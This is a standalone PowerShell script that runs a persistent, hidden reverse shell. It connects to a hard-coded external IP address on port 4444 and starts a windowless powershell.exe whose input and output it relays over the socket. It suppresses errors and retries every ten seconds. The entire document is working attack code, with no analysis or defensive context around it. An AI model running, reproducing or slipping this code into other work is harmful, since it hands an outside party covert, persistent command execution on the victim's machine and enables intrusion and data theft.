while ($true) {
    try {
        $client = New-Object System.Net.Sockets.TCPClient("31.57.46.127", 4444)
        if ($client.Connected) {
            $stream = $client.GetStream()
            $writer = New-Object System.IO.StreamWriter($stream)
            $writer.AutoFlush = $true
            $reader = New-Object System.IO.StreamReader($stream)

            $psi = New-Object System.Diagnostics.ProcessStartInfo
            $psi.FileName = "powershell.exe"
            $psi.RedirectStandardInput = $true
            $psi.RedirectStandardOutput = $true
            $psi.RedirectStandardError = $true
            $psi.UseShellExecute = $false
            $psi.CreateNoWindow = $true

            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $psi
            $process.Start() | Out-Null

            $stdout = $process.StandardOutput
            $stderr = $process.StandardError
            $stdin = $process.StandardInput

            # Async Output
            $outputThread = [System.Threading.Thread]::new({
                param ($out, $streamWriter)
                while (($line = $out.ReadLine()) -ne $null) {
                    $streamWriter.WriteLine($line)
                }
            }, @($stdout, $writer))
            $errorThread = [System.Threading.Thread]::new({
                param ($err, $streamWriter)
                while (($line = $err.ReadLine()) -ne $null) {
                    $streamWriter.WriteLine($line)
                }
            }, @($stderr, $writer))

            $outputThread.IsBackground = $true
            $errorThread.IsBackground = $true
            $outputThread.Start()
            $errorThread.Start()

            # Input loop
            while ($client.Connected -and -not $process.HasExited) {
                $line = $reader.ReadLine()
                if ($line -ne $null) {
                    $stdin.WriteLine($line)
                }
                Start-Sleep -Milliseconds 100
            }

            $process.Close()
            $client.Close()
        }
    } catch {
        # Silently retry
    }
    Start-Sleep -Seconds 10
}
